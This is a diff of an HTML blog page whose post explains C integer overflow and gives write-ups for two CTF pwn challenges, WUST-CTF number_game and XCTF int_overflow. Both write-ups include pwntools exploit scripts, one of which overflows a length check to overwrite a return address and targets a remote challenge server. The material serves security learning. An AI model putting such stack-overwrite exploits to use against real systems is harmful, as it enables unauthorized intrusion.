@@ -24,32 +24,34 @@
     var CONFIG = {"hostname":"mark0519.github.io","root":"/","scheme":"Pisces","version":"8.0.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
   </script>
 
-  <meta name="description" content="pwn整数溢出攻防世界int_overflow">
+  <meta name="description" content="pwn整数溢出整数溢出原理具体原理​    在 C 语言中，整数的基本数据类型分为短整型 (short)，整型 (int)，长整型 (long)，这三个数据类型还分为有符号和无符号，每种数据类型都有各自的大小范围，(因为数据类型的大小范围是编译器决定的，所以之后所述都默认是 64 位下使用 gcc-5.4)，当程序中的数据超过其数据类型的范围，则会造成溢出，整数类型的溢出被称为整数溢出。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="pwn整数溢出">
 <meta property="og:url" content="https://mark0519.github.io/2021/01/09/pwn%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/index.html">
 <meta property="og:site_name" content="mark0519的博客">
-<meta property="og:description" content="pwn整数溢出攻防世界int_overflow">
+<meta property="og:description" content="pwn整数溢出整数溢出原理具体原理​    在 C 语言中，整数的基本数据类型分为短整型 (short)，整型 (int)，长整型 (long)，这三个数据类型还分为有符号和无符号，每种数据类型都有各自的大小范围，(因为数据类型的大小范围是编译器决定的，所以之后所述都默认是 64 位下使用 gcc-5.4)，当程序中的数据超过其数据类型的范围，则会造成溢出，整数类型的溢出被称为整数溢出。">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/2b0ad190f6187e2d886cefb31556ab673e3a04fe.png">
+<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/afae5ed583f99d724d404aaeff515d2f23d15061.png">
+<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/bc437d2cf2843f22c5853067e1caed0fa836194c.png">
+<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/b5efb7544a2bd617a9be8ec601cbbb40ca79e9d4.png">
 <meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/743f07915787a751331bae9ce87e0feb25e6a94a.png">
 <meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/500e04fb9ea10fe74c6c5b0bdfd1ad52dacb399c.png">
 <meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/d6b5560104d1c0681659e20aa6663c3ebf0e49d3.png">
 <meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/76a6cb4493cfe0c4ef4e0b5c2055a8f88cdcfc4f.png">
 <meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/5f3ccf452e0bcf3dc5d697038616801e74ef585f.png">
 <meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/495a914ed8834f34a49e0bcf7ffc02badbe090b9.png">
-<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/2b0ad190f6187e2d886cefb31556ab673e3a04fe.png">
-<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/afae5ed583f99d724d404aaeff515d2f23d15061.png">
 <meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/ba79c6f648519d0357a7bea5f500784f0cd29a40.png">
 <meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/5f5b23c5c9b377972d3f22ce424d44b363d0d555.png">
 <meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/a6e5da8d24384845f823330bb49e0cd91e12a0da.png">
 <meta property="article:published_time" content="2021-01-09T07:17:19.000Z">
-<meta property="article:modified_time" content="2021-01-09T07:57:08.896Z">
+<meta property="article:modified_time" content="2021-01-21T14:03:14.832Z">
 <meta property="article:author" content="mark0519">
 <meta property="article:tag" content="pwn">
 <meta property="article:tag" content="python2">
 <meta property="article:tag" content="ctf">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/743f07915787a751331bae9ce87e0feb25e6a94a.png">
+<meta name="twitter:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/2b0ad190f6187e2d886cefb31556ab673e3a04fe.png">
 
 
 <link rel="canonical" href="https://mark0519.github.io/2021/01/09/pwn%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/">
@@ -193,7 +195,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <section class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA"><span class="nav-number">1.</span> <span class="nav-text">pwn整数溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">1.2.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA"><span class="nav-number">1.</span> <span class="nav-text">pwn整数溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.</span> <span class="nav-text">整数溢出原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B7%E4%BD%93%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.1.</span> <span class="nav-text">具体原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BE%E4%BE%8B"><span class="nav-number">1.1.2.</span> <span class="nav-text">举例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WUST-CTF-number-game"><span class="nav-number">1.2.</span> <span class="nav-text">WUST-CTF number_game</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="nav-number">1.2.1.</span> <span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">1.2.2.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cint-overflow"><span class="nav-number">1.3.</span> <span class="nav-text">攻防世界int_overflow</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-1"><span class="nav-number">1.3.1.</span> <span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-1"><span class="nav-number">1.3.2.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></li></ol></div>
         </section>
         <!--/noindex-->
 
@@ -285,10 +287,16 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2021-01-09 15:17:19 / 修改时间：15:57:08" itemprop="dateCreated datePublished" datetime="2021-01-09T15:17:19+08:00">2021-01-09</time>
+      <time title="创建时间：2021-01-09 15:17:19" itemprop="dateCreated datePublished" datetime="2021-01-09T15:17:19+08:00">2021-01-09</time>
     </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-01-21 22:03:14" itemprop="dateModified" datetime="2021-01-21T22:03:14+08:00">2021-01-21</time>
+      </span>
 
   
 </div>
@@ -300,12 +308,70 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h1 id="pwn整数溢出"><a href="#pwn整数溢出" class="headerlink" title="pwn整数溢出"></a>pwn整数溢出</h1><p>攻防世界int_overflow</p>
-<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/743f07915787a751331bae9ce87e0feb25e6a94a.png"></p>
+        <h1 id="pwn整数溢出"><a href="#pwn整数溢出" class="headerlink" title="pwn整数溢出"></a>pwn整数溢出</h1><h2 id="整数溢出原理"><a href="#整数溢出原理" class="headerlink" title="整数溢出原理"></a>整数溢出原理</h2><h3 id="具体原理"><a href="#具体原理" class="headerlink" title="具体原理"></a>具体原理</h3><p>​    在 C 语言中，整数的基本数据类型分为短整型 (short)，整型 (int)，长整型 (long)，这三个数据类型还分为有符号和无符号，每种数据类型都有各自的大小范围，(因为数据类型的大小范围是编译器决定的，所以之后所述都默认是 64 位下使用 gcc-5.4)，当程序中的数据超过其数据类型的范围，则会造成溢出，整数类型的溢出被称为整数溢出。</p>
 <a id="more"></a>
 
+<p>具体数据类型的范围如下：</p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>字节</th>
+<th>范围</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>short int</td>
+<td>2byte(word)</td>
+<td>0<del>32767(0</del>0x7fff) -32768<del>-1(0x8000</del>0xffff)</td>
+</tr>
+<tr>
+<td>unsigned short int</td>
+<td>2byte(word)</td>
+<td>0<del>65535(0</del>0xffff)</td>
+</tr>
+<tr>
+<td>int</td>
+<td>4byte(dword)</td>
+<td>0<del>2147483647(0</del>0x7fffffff) -2147483648<del>-1(0x80000000</del>0xffffffff)</td>
+</tr>
+<tr>
+<td>unsigned int</td>
+<td>4byte(dword)</td>
+<td>0<del>4294967295(0</del>0xffffffff)</td>
+</tr>
+<tr>
+<td>long int</td>
+<td>8byte(qword)</td>
+<td>正: 0<del>0x7fffffffffffffff 负: 0x8000000000000000</del>0xffffffffffffffff</td>
+</tr>
+<tr>
+<td>unsigned long int</td>
+<td>8byte(qword)</td>
+<td>0~0xffffffffffffffff</td>
+</tr>
+</tbody></table>
+<h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> var1 = <span class="number">1</span>, var2 = <span class="number">65537</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span>));</span><br><span class="line">	<span class="keyword">if</span> (var1 == var2)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;溢出&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输出结果</p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/2b0ad190f6187e2d886cefb31556ab673e3a04fe.png"></p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/afae5ed583f99d724d404aaeff515d2f23d15061.png"></p>
+<h2 id="WUST-CTF-number-game"><a href="#WUST-CTF-number-game" class="headerlink" title="WUST-CTF number_game"></a>WUST-CTF number_game</h2><p>武汉科技大学的ctf萌新赛，是我在找这个方面的题目时发现的，同样考查整数溢出的知识</p>
+<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>反汇编elf文件</p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/bc437d2cf2843f22c5853067e1caed0fa836194c.png"></p>
+<p>可以看到是需要输入一个数小于0，取反之后再次小于0即可得到shell</p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/b5efb7544a2bd617a9be8ec601cbbb40ca79e9d4.png"></p>
+<p>由于v1是int型，故最多表示4,294,967,296个数，含有符号，即表示</p>
+<p><strong>-2147483648~2147483647</strong></p>
+<p>故可取v1 = -2147483648</p>
+<p>则v1取符号后仍未负数</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;.\number_game&#x27;</span>)</span><br><span class="line">payload = <span class="number">-2147483648</span></span><br><span class="line">sh.sendline(p32(payload))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="攻防世界int-overflow"><a href="#攻防世界int-overflow" class="headerlink" title="攻防世界int_overflow"></a>攻防世界int_overflow</h2><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/743f07915787a751331bae9ce87e0feb25e6a94a.png"></p>
 <p>连接：<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=pwn&amp;number=2&amp;grade=0&amp;id=5058&amp;page=1">https://adworld.xctf.org.cn/task/answer?type=pwn&amp;number=2&amp;grade=0&amp;id=5058&amp;page=1</a></p>
-<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>附件checkesc分析</p>
+<h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>附件checkesc分析</p>
 <p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/500e04fb9ea10fe74c6c5b0bdfd1ad52dacb399c.png"></p>
 <p>没有开启canary保护，可以使用栈溢出的漏洞</p>
 <p>接着使用IDApro分析</p>
@@ -320,12 +386,6 @@
 <p>最大值应该为255：</p>
 <p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/495a914ed8834f34a49e0bcf7ffc02badbe090b9.png"></p>
 <p>如果超出255，就会溢出，即对于unsigned int8型的变量v1和v2，如果v1=0,v2=256；则v1==v2;</p>
-<p>举例：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> var1 = <span class="number">1</span>, var2 = <span class="number">65537</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span>));</span><br><span class="line">	<span class="keyword">if</span> (var1 == var2)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;溢出&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>输出结果</p>
-<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/2b0ad190f6187e2d886cefb31556ab673e3a04fe.png"></p>
-<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/afae5ed583f99d724d404aaeff515d2f23d15061.png"></p>
 <p>故此题的输入密码的长度应为 4 ~ 8 或 255+4 ~ 255+8</p>
 <p>找到漏洞后，按shift+f12查找关键字</p>
 <p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/ba79c6f648519d0357a7bea5f500784f0cd29a40.png"></p>
@@ -336,7 +396,7 @@
 <p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/a6e5da8d24384845f823330bb49e0cd91e12a0da.png"></p>
 <p>得到函数的starts地址，即可在输入passwd时构造字符将chack_passwd的函数返回地址改为what_is_this()函数的地址</p>
 <p>且由于dest变量到栈底的偏移量为0x14，故即可构造exp</p>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c=remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">36374</span>)</span><br><span class="line"></span><br><span class="line">flag_adress=<span class="number">0x804868B</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x14</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p32(flag_adress)+<span class="string">&#x27;a&#x27;</span>*(<span class="number">256</span><span class="number">-0x14</span><span class="number">-4</span><span class="number">-4</span>+<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">c.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">c.sendlineafter(<span class="string">&quot;Please input your username:\n&quot;</span>,<span class="string">&quot;sjj&quot;</span>)</span><br><span class="line">c.recvuntil(<span class="string">&quot;Please input your passwd:\n&quot;</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.recv()</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br><span class="line">c.recv()</span><br></pre></td></tr></table></figure>
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c=remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">36374</span>)</span><br><span class="line"></span><br><span class="line">flag_adress=<span class="number">0x804868B</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;zbrnb&quot;</span>.ljust(<span class="number">0x14</span>+<span class="number">4</span>,<span class="string">&#x27;a&#x27;</span>)+p32(flag_adress)+<span class="string">&quot;zbrnb&quot;</span>.ljust(<span class="number">256</span><span class="number">-0x14</span><span class="number">-4</span><span class="number">-4</span>+<span class="number">4</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">c.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">c.sendlineafter(<span class="string">&quot;Please input your username:\n&quot;</span>,<span class="string">&quot;Retr_0nb&quot;</span>)</span><br><span class="line">c.recvuntil(<span class="string">&quot;Please input your passwd:\n&quot;</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.recv()</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br><span class="line">c.recv()</span><br></pre></td></tr></table></figure>
 
 <p>即可得到flag</p>
 
